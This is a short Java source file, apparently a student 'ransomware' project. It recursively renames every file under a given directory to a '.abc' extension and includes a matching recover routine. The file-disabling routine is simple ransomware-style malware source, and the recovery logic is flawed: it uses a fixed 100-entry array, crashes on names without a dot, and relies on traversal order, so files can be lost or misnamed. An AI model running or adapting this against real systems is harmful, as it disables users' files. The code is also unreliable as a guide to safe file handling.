package Project6_Ransomware;

import java.io.File;
import java.io.IOException;

public class Function {
	String st[] = new String[100];
	int cnt1 = 0;
	int cnt2 = 0;
	void attack(String path) {
		File file = new File(path);
		File list[] = file.listFiles();
		for (int i = 0; i < list.length; i++) {
			if (list[i].isDirectory()) {
				try {
					attack(list[i].getCanonicalPath().toString());
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} 
			else {
				File f = new File(list[i].getParentFile().getPath(),list[i].getName().substring(0, list[i].getName().indexOf(".")) + ".abc");
				System.out.println(list[i].getName().substring(list[i].getName().indexOf(".") + 1));
				st[cnt1++] = list[i].getName().substring(list[i].getName().indexOf("."));
				System.out.println(list[i].renameTo(f));
			}

		}
		cnt2 = 0;
	}
	
	void recover(String path){
		File file = new File(path);
		File list[] = file.listFiles();
		for (int i = 0; i < list.length; i++) {
			if (list[i].isDirectory()) {
				try {
					recover(list[i].getCanonicalPath().toString());
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} 
			else {
				File f = new File(list[i].getParentFile().getPath(),list[i].getName().substring(0, list[i].getName().indexOf(".")) + st[cnt2++]);
				System.out.println(list[i].getName().substring(list[i].getName().indexOf(".") + 1));
				System.out.println(list[i].renameTo(f));
			}

		}
		cnt1 = 0;
	}
}
